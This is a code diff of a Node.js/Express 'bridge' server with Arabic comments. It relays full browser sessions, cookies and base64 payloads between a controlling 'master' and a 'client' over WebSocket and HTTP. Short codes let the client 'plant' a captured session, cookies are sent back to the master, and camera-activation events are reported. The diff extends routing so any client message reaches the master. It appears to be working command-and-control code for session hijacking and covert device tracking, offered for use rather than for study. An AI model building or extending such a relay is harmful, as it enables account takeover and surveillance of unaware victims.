@@ -8,7 +8,7 @@ const app = express();
 // السماح بطلبات من جميع النطاقات (CORS)
 app.use(cors());
 
-// 🔥 مهم جداً: زيادة الحد الأقصى لحجم البيانات لأن الجلسة الكاملة (Storage + Cookies) قد تكون كبيرة
+// 🔥 مهم جداً: زيادة الحد الأقصى لحجم البيانات لأن الجلسة الكاملة والبايلود قد تكون كبيرة
 app.use(express.json({ limit: '50mb' }));
 
 const server = http.createServer(app);
@@ -20,13 +20,14 @@ const activeMasters = new Map();
 const shortSessions = new Map();
 
 // ==========================================
-// 1. قسم الماستر (WebSocket) لتتبع الخطوات والتوجيه العكسي
+// 1. العقل المركزي (WebSocket Router) - النقل اللحظي بين الكليان والماستر
 // ==========================================
 wss.on('connection', (ws) => {
     ws.on('message', (message) => {
         try {
             const data = JSON.parse(message);
-            // عندما يرسل الماستر طلب تسجيل الجلسة باستخدام الكود القصير
+            
+            // أ. تسجيل الماستر عند إنشائه للرابط
             if (data.type === 'REGISTER_MASTER' && data.session_id) {
                 activeMasters.set(data.session_id, ws);
                 console.log(`[MASTER LINKED] Session ID: ${data.session_id}`);
@@ -36,6 +37,17 @@ wss.on('connection', (ws) => {
                     activeMasters.delete(data.session_id);
                     console.log(`[MASTER DISCONNECTED] Session ID: ${data.session_id}`);
                 });
+            } 
+            // ب. 🚀 توجيه أي رسالة قادمة من الكليان (مثل البايلود أو الإشعارات) مباشرة للماستر
+            else if (data.session_id && data.type !== 'REGISTER_MASTER') {
+                const masterWs = activeMasters.get(data.session_id);
+                
+                if (masterWs && masterWs.readyState === WebSocket.OPEN) {
+                    masterWs.send(JSON.stringify(data));
+                    console.log(`[FORWARDED TO MASTER] Type: ${data.type} | Session: ${data.session_id}`);
+                } else {
+                    console.warn(`[WARNING] Master not found or disconnected for session: ${data.session_id}`);
+                }
             }
         } catch (err) {
             console.error('WebSocket parsing error:', err);
@@ -44,7 +56,7 @@ wss.on('connection', (ws) => {
 });
 
 // ==========================================
-// 2. نظام الروابط القصيرة وتناقل الجلسة
+// 2. نظام الروابط القصيرة وتناقل الجلسة (HTTP)
 // ==========================================
 
 // أ: مسار لإنشاء كود قصير وحفظ الجلسة الكاملة القادمة من الماستر
@@ -60,7 +72,7 @@ app.post('/create-short-link', (req, res) => {
     
     // حفظ البيانات في السيرفر وربطها بالكود
     shortSessions.set(shortCode, sessionData);
-    console.log(`[SESSION PACKAGED] Short Code: ${shortCode} | Proxy Included: ${!!sessionData.proxy}`);
+    console.log(`[SESSION PACKAGED] Short Code: ${shortCode} | IP Included: ${!!sessionData.ip_address}`);
 
     // تنظيف الذاكرة: حذف الجلسة تلقائياً بعد 15 دقيقة لتفادي استهلاك الذاكرة
     setTimeout(() => {
@@ -71,7 +83,7 @@ app.post('/create-short-link', (req, res) => {
     res.json({ success: true, shortCode: shortCode });
 });
 
-// ب: مسار لجلب البيانات باستخدام الكود القصير (يستدعيه العميل لزرع الجلسة)
+// ب: مسار لجلب البيانات باستخدام الكود القصير (يستدعيه الكليان لزرع الجلسة والبدء)
 app.get('/get-session-data/:code', (req, res) => {
     const code = req.params.code;
     const data = shortSessions.get(code);
@@ -84,16 +96,15 @@ app.get('/get-session-data/:code', (req, res) => {
 });
 
 // ==========================================
-// 3. قسم العميل (HTTP POST) لإرسال النتائج العكسية و التتبع
+// 3. مسارات HTTP الاحتياطية (للتوافق القديم إن وُجد)
 // ==========================================
 
-// أ: مسار الترحيل العكسي - إرسال الكوكيز الناجحة للماستر
+// أ: مسار الترحيل العكسي - إرسال الكوكيز للماستر (تم استبداله بالـ WS ولكنه موجود كاحتياط)
 app.post('/return-session', (req, res) => {
     const { session_id, final_session } = req.body;
     
     const masterWs = activeMasters.get(session_id);
     if (masterWs && masterWs.readyState === WebSocket.OPEN) {
-        // إرسال الكوكيز الجديدة التي تثبت النجاح إلى الماستر
         masterWs.send(JSON.stringify({ 
             type: 'SESSION_RETURNED', 
             final_session: final_session 
@@ -106,7 +117,7 @@ app.post('/return-session', (req, res) => {
     res.json({ success: true });
 });
 
-// ب: مسار نقل التتبع اللحظي (مثل: الكاميرا اشتغلت)
+// ب: مسار نقل التتبع اللحظي (HTTP Fallback)
 app.post('/', (req, res) => {
     const { session_id, type, payload, reason } = req.body;
 
@@ -117,7 +128,6 @@ app.post('/', (req, res) => {
     const masterWs = activeMasters.get(session_id);
     const isMasterConnected = masterWs && masterWs.readyState === WebSocket.OPEN;
 
-    // تم الإبقاء عليه احتياطياً لتوافق الأكواد السابقة إن وجدت
     if (payload) {
         try {
             const decodedStr = Buffer.from(payload, 'base64').toString('utf-8');
@@ -134,7 +144,6 @@ app.post('/', (req, res) => {
         }
     }
 
-    // إرسال خطوات التتبع (تفعيل الكاميرا، أخطاء، الخ...)
     if (type) {
         if (isMasterConnected) {
             masterWs.send(JSON.stringify({
@@ -153,9 +162,12 @@ app.post('/', (req, res) => {
 // ==========================================
 app.get('/', (req, res) => {
     res.send(`
-        <div style="font-family: monospace; padding: 50px; text-align: center; background: #000; color: #00ff9d; height: 100vh;">
-            <h1>SAMURAI NUCLEAR BRIDGE SERVER IS ONLINE 🚀</h1>
-            <p>Full Session Replay Architecture is running securely...</p>
+        <div style="font-family: monospace; padding: 50px; text-align: center; background: #000; color: #00ff9d; height: 100vh; overflow: hidden; margin: 0;">
+            <h1 style="font-size: 3rem; margin-bottom: 10px;">SAMURAI NUCLEAR SERVER IS ONLINE 🚀</h1>
+            <p style="font-size: 1.5rem; color: #aaa;">Full Session & Payload Replay Architecture is running securely...</p>
+            <div style="margin-top: 50px; padding: 20px; border: 2px solid #00ff9d; display: inline-block; border-radius: 10px;">
+                <span style="color: #ffcc00; font-weight: bold;">[WEBSOCKET ROUTER:]</span> ACTIVE
+            </div>
         </div>
     `);
 });
